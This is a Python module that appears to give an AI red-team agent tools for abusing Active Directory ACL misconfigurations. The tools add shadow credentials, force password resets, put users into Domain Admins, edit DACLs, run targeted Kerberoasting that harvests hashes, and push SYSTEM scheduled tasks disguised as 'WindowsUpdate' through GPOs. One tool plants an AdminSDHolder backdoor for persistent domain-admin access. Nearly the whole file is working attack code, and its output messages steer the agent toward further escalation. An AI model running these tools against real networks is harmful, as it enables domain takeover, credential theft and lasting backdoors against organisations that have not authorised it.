"""Red Team ACL exploitation tools.

This module provides toolsets for exploiting Active Directory
ACL misconfigurations (GenericAll, GenericWrite, WriteDacl, etc.)
"""

import re

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset
from loguru import logger

from ares.core.models import Hash
from ares.tools.red.common import (
    AnyRedTeamState,
    run_tool,
)


class ACLExploitTools(Toolset):
    """Tools for exploiting Active Directory ACL misconfigurations.

    When BloodHound identifies GenericAll, GenericWrite, WriteDacl, or WriteOwner
    permissions, use these tools to exploit them.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def pywhisker(
        self,
        target_samaccountname: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "add",
    ) -> str:
        """
        Add/remove shadow credentials for privilege escalation.

        Shadow credentials abuse msDS-KeyCredentialLink to add attacker-controlled
        keys, enabling PKINIT authentication without knowing the password.

        Use when you have GenericAll or GenericWrite on a user/computer.

        Args:
            target_samaccountname: Target account to add shadow creds to
            domain: Target domain
            username: Your username with GenericAll/GenericWrite
            password: Your password
            dc_ip: Domain controller IP
            action: "add" to add shadow creds, "list" to view, "remove" to clean up

        Returns:
            Shadow credentials result (includes PFX path if successful)

        Example:
            >>> pywhisker("Administrator", "domain.local", "user", "pass", "192.168.58.10")
        """
        cmd = [
            "pywhisker.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--target",
            target_samaccountname,
            "--action",
            action,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Running pywhisker against {target_samaccountname} ({action})")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result.lower() or "saved" in result.lower():
                logger.info("[+] Shadow credentials added! Use certipy_auth with the PFX file.")
                result = (
                    "🚨 SHADOW CREDENTIALS ADDED!\n"
                    "\u2192 Use certipy_auth with the generated PFX file to get NTLM hash\n\n"
                    + result
                )

            return result

        except Exception as e:
            return f"Pywhisker failed: {e}"

    @dn.tool_method
    def bloodyad_add_group_member(
        self,
        target_user: str,
        group: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Add a user to a group via ACL abuse (bloodyAD).

        Use when you have GenericAll, GenericWrite, or WriteMember on a group.
        Add yourself or a controlled user to Domain Admins or other privileged groups.

        Args:
            target_user: User to add to the group
            group: Target group (e.g., "Domain Admins")
            domain: Target domain
            username: Your username with write access
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Group modification result

        Example:
            >>> bloodyad_add_group_member("controlled_user", "Domain Admins", "domain.local", "user", "pass", "192.168.58.10")
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "add",
            "groupMember",
            group,
            target_user,
        ]

        try:
            logger.info(f"[*] Adding {target_user} to {group} via bloodyAD")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "added" in result.lower():
                logger.info(f"[+] Successfully added {target_user} to {group}!")
                result = f"\u2705 {target_user} added to {group}!\n" + result

            return result

        except Exception as e:
            return f"bloodyAD failed: {e}"

    @dn.tool_method
    def bloodyad_set_password(
        self,
        target_user: str,
        new_password: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Reset a user's password via ACL abuse (bloodyAD).

        Use when you have GenericAll, GenericWrite, or ForceChangePassword on a user.
        Allows setting a known password without knowing the original.

        Args:
            target_user: User whose password to reset
            new_password: New password to set
            domain: Target domain
            username: Your username with write access
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Password reset result

        Example:
            >>> bloodyad_set_password("admin_user", "NewP@ssw0rd!", "domain.local", "user", "pass", "192.168.58.10")
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "set",
            "password",
            target_user,
            new_password,
        ]

        try:
            logger.info(f"[*] Resetting password for {target_user} via bloodyAD")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "changed" in result.lower():
                logger.info(f"[+] Password for {target_user} reset successfully!")
                result = (
                    f"\u2705 Password reset for {target_user}!\n"
                    f"\u2192 New credential: {target_user}:{new_password}\n"
                    f"\u2192 Use domain_admin_checker with new creds\n\n" + result
                )

            return result

        except Exception as e:
            return f"bloodyAD failed: {e}"

    @dn.tool_method
    def force_change_password(
        self,
        target_user: str,
        new_password: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Force change a user's password via ForceChangePassword ACL (net rpc).

        Alternative to bloodyad_set_password using rpcclient/net rpc.
        Use when you have ForceChangePassword permission on a user.

        **WARNING**: This is disruptive - the user's real password changes!

        Args:
            target_user: User whose password to reset
            new_password: New password to set
            domain: Target domain
            username: Your username with ForceChangePassword permission
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Password change result

        Example:
            >>> force_change_password("victim_user", "NewP@ss123!", "domain.local", "attacker", "pass", "192.168.58.10")
        """
        cmd = [
            "net",
            "rpc",
            "password",
            target_user,
            new_password,
            "-U",
            f"{domain}/{username}%{password}",
            "-S",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Force changing password for {target_user}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if returncode == 0 or "success" in result.lower():
                logger.info(f"[+] Password for {target_user} changed successfully!")
                result = (
                    f"\u2705 Password changed for {target_user}!\n"
                    f"\u2192 New credential: {target_user}:{new_password}\n"
                    f"\u2192 Test with domain_admin_checker immediately\n\n" + result
                )

            return result

        except Exception as e:
            return f"Force password change failed: {e}"

    @dn.tool_method
    def dacl_edit(
        self,
        target_dn: str,
        principal: str,
        rights: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "write",
    ) -> str:
        """
        Modify DACL permissions on AD objects (dacledit.py).

        Use when you have WriteDacl permission. Grant yourself additional rights
        to enable further attacks (e.g., grant GenericAll to perform shadow creds).

        Args:
            target_dn: Distinguished name of target object
            principal: User/group to grant rights to
            rights: Rights to grant ('FullControl', 'GenericAll', 'GenericWrite', 'WriteMembers')
            domain: Target domain
            username: Your username with WriteDacl permission
            password: Your password
            dc_ip: Domain controller IP
            action: 'write' to add, 'remove' to delete permissions

        Returns:
            DACL modification result

        Example:
            >>> dacl_edit("CN=Domain Admins,CN=Users,DC=domain,DC=local", "attacker", "GenericAll", "domain.local", "user", "pass", "192.168.58.10")
        """
        cmd = [
            "dacledit.py",
            "-action",
            action,
            "-rights",
            rights,
            "-principal",
            principal,
            "-target-dn",
            target_dn,
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Modifying DACL on {target_dn}: granting {rights} to {principal}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "modified" in result.lower():
                logger.info("[+] DACL modified successfully!")
                result = (
                    f"\u2705 DACL modified: {principal} now has {rights} on target!\n"
                    "\u2192 Use new permissions for further exploitation\n\n" + result
                )

            return result

        except Exception as e:
            return f"DACL edit failed: {e}"

    @dn.tool_method
    def targeted_kerberoast(
        self,
        target_user: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform targeted Kerberoasting by adding an SPN to a user (GenericWrite abuse).

        When you have GenericWrite on a user, you can add an SPN and then Kerberoast them.
        This allows cracking the password of any user you have GenericWrite on.

        Attack chain: Add SPN -> Request TGS -> Crack offline -> Remove SPN

        Args:
            target_user: User to add SPN to and Kerberoast
            domain: Target domain
            username: Your username with GenericWrite
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Kerberoast hash for the target user

        Example:
            >>> targeted_kerberoast("high_value_user", "domain.local", "attacker", "pass", "192.168.58.10")
        """
        cmd = [
            "targetedKerberoast.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--dc-ip",
            dc_ip,
            "-t",
            target_user,
        ]

        try:
            logger.info(f"[*] Performing targeted Kerberoast on {target_user}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "$krb5tgs$" in result:
                logger.info("[+] Targeted Kerberoast successful - hash obtained!")
                if self.state:
                    matches = re.findall(r"(\$krb5tgs\$[^\s]+)", result)
                    for value in matches:
                        username_value = "Unknown"
                        domain_value = ""
                        parts = value.split("$")
                        if len(parts) >= 5:
                            user_part = parts[3].lstrip("*")
                            realm_part = parts[4]
                            if user_part:
                                username_value = user_part
                            if realm_part:
                                domain_value = realm_part
                        hash_obj = Hash(
                            username=username_value,
                            hash_value=value,
                            hash_type="Kerberos",
                            domain=domain_value or domain,
                        )
                        if hasattr(self.state, "add_hash"):
                            self.state.add_hash(hash_obj, "targeted_kerberoast")
                        else:
                            self.state.hashes.append(hash_obj)
                result = (
                    f"🚨 KERBEROAST HASH OBTAINED FOR {target_user}!\n"
                    "\u2192 Use crack_with_hashcat with mode 13100 to crack\n"
                    "\u2192 SPN will be automatically cleaned up\n\n" + result
                )

            return result

        except Exception as e:
            return f"Targeted Kerberoast failed: {e}"

    @dn.tool_method
    def sharpgpoabuse(
        self,
        gpo_name: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "AddLocalAdmin",
        user_to_add: str | None = None,
        computer_target: str | None = None,
    ) -> str:
        """
        Abuse GPO edit permissions to gain local admin on GPO-linked computers.

        Use when BloodHound shows you have WriteProperty, WriteDacl, or GenericWrite
        on a Group Policy Object. This tool modifies the GPO to:
        - Add a user to local administrators on all linked computers
        - Create an immediate scheduled task for code execution
        - Add a new local user account

        **CRITICAL**: This modifies Active Directory GPOs. Changes apply to ALL
        computers where the GPO is linked. Use carefully in production environments.

        Args:
            gpo_name: Name of the GPO you have write access to (e.g., "Default Domain Policy")
            domain: Target domain
            username: Username with GPO write permissions
            password: Password for authentication
            dc_ip: Domain controller IP address
            action: Attack action - one of:
                    - "AddLocalAdmin": Add user to local Administrators group
                    - "AddComputerTask": Create scheduled task for execution
                    - "AddUserRights": Grant user rights assignment
            user_to_add: User to add as local admin (default: current user)
            computer_target: Specific computer to target (default: all GPO-linked)

        Returns:
            GPO abuse result - success indicates local admin on linked computers

        Example:
            >>> sharpgpoabuse("Workstations Policy", "domain.local", "user", "pass", "192.168.58.10")
        """
        # Default user_to_add to the current user
        if not user_to_add:
            user_to_add = username

        # Map friendly action names to SharpGPOAbuse parameters
        action_params = {
            "AddLocalAdmin": ["--AddLocalAdmin", "--UserAccount", user_to_add],
            "AddComputerTask": [
                "--AddComputerTask",
                "--TaskName",
                "WindowsUpdate",
                "--Author",
                "NT AUTHORITY\\SYSTEM",
                "--Command",
                "cmd.exe",
                "--Arguments",
                f"/c net localgroup administrators {user_to_add} /add",
            ],
            "AddUserRights": [
                "--AddUserRights",
                "--UserRights",
                "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight",
                "--UserAccount",
                user_to_add,
            ],
        }

        if action not in action_params:
            return f"Invalid action '{action}'. Supported: AddLocalAdmin, AddComputerTask, AddUserRights"

        # Build SharpGPOAbuse command
        # SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "GPO Name"
        cmd = [
            "SharpGPOAbuse.exe",
            *action_params[action],
            "--GPOName",
            gpo_name,
            "--Domain",
            domain,
            "--DomainController",
            dc_ip,
        ]

        if computer_target:
            cmd.extend(["--Force", "--FilterEnabled"])

        # SharpGPOAbuse is a .NET tool, run via Wine or mono on Linux
        # First try direct execution (if running on Windows/Wine), then mono
        try:
            logger.info(f"[*] Running SharpGPOAbuse: {action} on GPO '{gpo_name}'")

            # Try with mono first (cross-platform)
            mono_cmd = ["mono", *cmd]
            stdout, stderr, _ = run_tool(mono_cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Check for success indicators
            success_indicators = [
                "success",
                "gplink",
                "modified",
                "added",
                "group policy",
                "local admin",
            ]
            if any(indicator in result.lower() for indicator in success_indicators):
                logger.info(f"[+] GPO abuse successful: {action} on {gpo_name}")
                return (
                    f"✅ GPO ABUSE SUCCESSFUL!\n"
                    f"→ Action: {action}\n"
                    f"→ GPO: {gpo_name}\n"
                    f"→ User: {user_to_add}\n"
                    f"→ Wait for GPO refresh (default: 90 minutes) or force with:\n"
                    f"   gpupdate /force on target computers\n\n"
                    f"→ After GPO refresh, {user_to_add} will have local admin on all "
                    f"computers where '{gpo_name}' is linked\n\n{result}"
                )

            # If we got output but no clear success, include it anyway
            if result.strip():
                return f"GPO abuse result (check output for success):\n{result}"

            return f"GPO abuse may have failed. Output:\n{result}"

        except FileNotFoundError:
            # Try alternative: bloodyAD for GPO modification
            logger.info("[*] SharpGPOAbuse not found, attempting bloodyAD GPO modification")
            try:
                # Use bloodyAD to set computer object attributes for scheduled task
                bloody_cmd = [
                    "bloodyAD",
                    "-d",
                    domain,
                    "-u",
                    username,
                    "-p",
                    password,
                    "--host",
                    dc_ip,
                    "add",
                    "groupMember",
                    "Administrators",
                    user_to_add,
                ]

                stdout, stderr, _ = run_tool(bloody_cmd, timeout_seconds=60)
                result = stdout + "\n" + (stderr or "")

                return (
                    f"⚠️ SharpGPOAbuse not available, attempted group member add:\n"
                    f"→ This adds {user_to_add} directly to domain group, not via GPO\n"
                    f"→ For GPO abuse, install SharpGPOAbuse or use manual GPO edit\n\n"
                    f"{result}"
                )

            except Exception as e:
                return (
                    f"GPO abuse failed: SharpGPOAbuse not found, bloodyAD fallback failed: {e}\n"
                    f"→ Install SharpGPOAbuse.exe (via Wine/Mono on Linux)\n"
                    f"→ Or manually edit GPO via RSAT tools"
                )

        except Exception as e:
            return f"SharpGPOAbuse failed: {e}"

    @dn.tool_method
    def pygpoabuse_immediate_task(
        self,
        gpo_name: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        command: str,
        task_name: str = "WindowsUpdate",
        force: bool = True,
    ) -> str:
        """
        Abuse GPO write permissions to create an immediate scheduled task.

        This is a FAST PATH TO DOMAIN ADMIN when you have write access to a GPO
        that is linked to a Domain Controller. The scheduled task executes as
        SYSTEM on all computers where the GPO is linked.

        Use when BloodHound shows:
        - GpoEditDeleteModifySecurity on a GPO
        - WriteProperty on a GPO
        - WriteDacl on a GPO
        - GenericWrite on a GPO

        **CRITICAL**: If the GPO is linked to a Domain Controller, this gives
        SYSTEM access on the DC = Domain Admin equivalent!

        Args:
            gpo_name: Name of the GPO you have write access to (e.g., "StarkWallpaper")
            domain: Target domain (e.g., contoso.local)
            username: Username with GPO write permissions
            password: Password for authentication
            dc_ip: Domain controller IP address
            command: Command to execute as SYSTEM (e.g., "net user hacker P@ss123! /add")
            task_name: Name for the scheduled task (default: WindowsUpdate)
            force: Force task creation without prompting (default: True)

        Returns:
            GPO abuse result - success indicates SYSTEM execution on linked computers

        Example:
            >>> pygpoabuse_immediate_task(
            ...     gpo_name="DefaultWallpaper",
            ...     domain="contoso.local",
            ...     username="sql_svc",
            ...     password="SqlP@ss123",  # pragma: allowlist secret
            ...     dc_ip="192.168.58.240",
            ...     command="net localgroup Administrators sql_svc /add"
            ... )
        """
        # Build pygpoabuse command for immediate scheduled task
        cmd = [
            "pygpoabuse",
            f"{domain}/{username}:{password}",
            "-gpo-id",
            gpo_name,  # pygpoabuse accepts GPO name or GUID
            "-command",
            command,
            "-taskname",
            task_name,
            "-dc-ip",
            dc_ip,
        ]

        if force:
            cmd.append("-f")

        try:
            logger.info(
                f"[*] Running pygpoabuse: creating immediate task '{task_name}' on GPO '{gpo_name}'"
            )
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Check for success indicators
            success_indicators = [
                "success",
                "created",
                "scheduled task",
                "gpo modified",
                "immediate task",
            ]
            if (
                any(indicator in result.lower() for indicator in success_indicators)
                or returncode == 0
            ):
                logger.info(
                    f"[+] pygpoabuse successful: immediate task created on GPO '{gpo_name}'"
                )
                return (
                    f"✅ GPO ABUSE SUCCESSFUL - IMMEDIATE SCHEDULED TASK CREATED!\n"
                    f"→ GPO: {gpo_name}\n"
                    f"→ Task Name: {task_name}\n"
                    f"→ Command: {command}\n"
                    f"→ The task will execute as SYSTEM within minutes!\n\n"
                    f"🚨 CRITICAL: If this GPO is linked to a Domain Controller,\n"
                    f"   you will have SYSTEM access on the DC = Domain Admin!\n\n"
                    f"→ To force immediate execution: gpupdate /force on target\n"
                    f"→ Or wait for automatic GPO refresh (default: 5 minutes for DCs)\n\n"
                    f"{result}"
                )

            # Check for common errors
            if "not found" in result.lower() or "does not exist" in result.lower():
                return (
                    f"❌ GPO '{gpo_name}' not found or access denied.\n"
                    f"→ Verify GPO name with: Get-GPO -All | Select DisplayName\n"
                    f"→ Ensure {username} has write access to the GPO\n\n"
                    f"{result}"
                )

            if "access denied" in result.lower() or "permission" in result.lower():
                return (
                    f"❌ Access denied to GPO '{gpo_name}'.\n"
                    f"→ User {username} may not have write permissions\n"
                    f"→ Check BloodHound for correct ACL rights\n\n"
                    f"{result}"
                )

            return f"GPO abuse result (check output for success):\n{result}"

        except FileNotFoundError:
            # pygpoabuse not installed, try alternative approach
            logger.warning("[!] pygpoabuse not found, attempting alternative GPO modification")
            return (
                "❌ pygpoabuse not installed.\n"
                "→ Install with: pip install pygpoabuse\n"
                "→ Or use sharpgpoabuse tool as alternative\n"
                "→ Manual option: Edit GPO via RSAT tools"
            )

        except Exception as e:
            return f"pygpoabuse failed: {e}"

    @dn.tool_method
    def bloodyad_add_genericall(
        self,
        target_dn: str,
        principal: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Grant GenericAll permission on an AD object via bloodyAD.

        Use when you have WriteDacl on an object. This grants full control
        which enables further attacks like password reset, shadow credentials,
        or group membership modification.

        Args:
            target_dn: Distinguished name or samAccountName of target
            principal: User/group to grant GenericAll to
            domain: Target domain
            username: Your username with WriteDacl permission
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            GenericAll grant result

        Example:
            >>> bloodyad_add_genericall(
            ...     target_dn="Domain Admins",
            ...     principal="attacker",
            ...     domain="domain.local",
            ...     username="user_with_writedacl",
            ...     password="password",  # pragma: allowlist secret
            ...     dc_ip="192.168.58.10"
            ... )
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "add",
            "genericAll",
            target_dn,
            principal,
        ]

        try:
            logger.info(f"[*] Granting GenericAll to {principal} on {target_dn}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or returncode == 0:
                logger.info(f"[+] GenericAll granted to {principal} on {target_dn}!")
                return (
                    f"✅ GenericAll granted!\n"
                    f"→ {principal} now has full control over {target_dn}\n"
                    f"→ If target is 'Domain Admins': use bloodyad_add_group_member to add yourself!\n"
                    f"→ If target is a user: use bloodyad_set_password or pywhisker\n\n"
                    f"{result}"
                )

            return f"GenericAll grant result:\n{result}"

        except Exception as e:
            return f"bloodyAD GenericAll failed: {e}"

    @dn.tool_method
    def adminsd_holder_add_ace(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        principal: str,
        right: str = "GenericAll",
    ) -> str:
        """Add ACE to AdminSDHolder container for persistent privileged access.

        AdminSDHolder is a special AD container that propagates ACEs to protected
        groups (Domain Admins, Enterprise Admins, etc.) every 60 minutes via SDProp.
        Adding GenericAll here creates a persistent backdoor that survives DA password
        resets and group membership changes.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: User with GenericAll on AdminSDHolder or DA rights
            password: Password for authentication
            dc_ip: Domain controller IP
            principal: User/group to grant persistent access (e.g., 'backdoor_user')
            right: Permission to grant (default: GenericAll)

        Returns:
            Result of ACE addition - if successful, principal will have
            persistent control over all protected groups after SDProp runs.
        """
        # AdminSDHolder DN is always CN=AdminSDHolder,CN=System,DC=...
        domain_dn = ",".join(f"DC={part}" for part in domain.split("."))
        adminsd_dn = f"CN=AdminSDHolder,CN=System,{domain_dn}"

        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "add",
            "genericAll",
            adminsd_dn,
            principal,
        ]

        try:
            logger.info(f"[*] Adding {right} ACE for {principal} on AdminSDHolder")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or returncode == 0:
                logger.info(f"[+] AdminSDHolder backdoor planted for {principal}!")

                # Store backdoor in state for persistence tracking
                if self.state and hasattr(self.state, "adminsd_holder_backdoors"):
                    backdoor_key = f"{domain.lower()}:{principal.lower()}"
                    if backdoor_key not in self.state.adminsd_holder_backdoors:
                        self.state.adminsd_holder_backdoors.append(backdoor_key)
                        logger.info(f"[+] AdminSDHolder backdoor tracked in state: {backdoor_key}")

                return (
                    f"✅ AdminSDHolder backdoor planted!\n"
                    f"→ {principal} will have {right} on ALL protected groups\n"
                    f"→ This includes: Domain Admins, Enterprise Admins, Schema Admins, etc.\n"
                    f"→ SDProp runs every 60 minutes - backdoor propagates automatically\n"
                    f"→ This survives password resets and group membership changes!\n\n"
                    f"⚠️ PERSISTENCE ACHIEVED - {principal} has permanent DA-level access\n\n"
                    f"{result}"
                )

            return f"AdminSDHolder ACE result:\n{result}"

        except Exception as e:
            return f"AdminSDHolder ACE addition failed: {e}"
